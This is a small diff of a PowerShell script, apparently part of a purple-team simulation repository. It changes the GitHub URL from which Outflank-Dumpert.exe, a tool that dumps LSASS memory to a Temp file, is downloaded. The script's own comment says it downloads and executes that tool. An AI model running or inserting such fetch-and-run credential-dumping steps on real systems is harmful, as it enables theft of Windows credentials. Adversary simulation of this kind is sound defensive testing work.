@@ -7,7 +7,7 @@
 #>
 
 # Download and execute Outflank-Dumpert.exe
-$url = "https://raw.githubusercontent.com/mthcht/Dumpert/exe/EXE/Outflank-Dumpert.exe"
+$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/Outflank-Dumpert.exe"
 $dumpfile = "$env:windir\Temp\dumpert.dmp"
 $outfile = "$env:tmp\dmpert.exe"
 try {
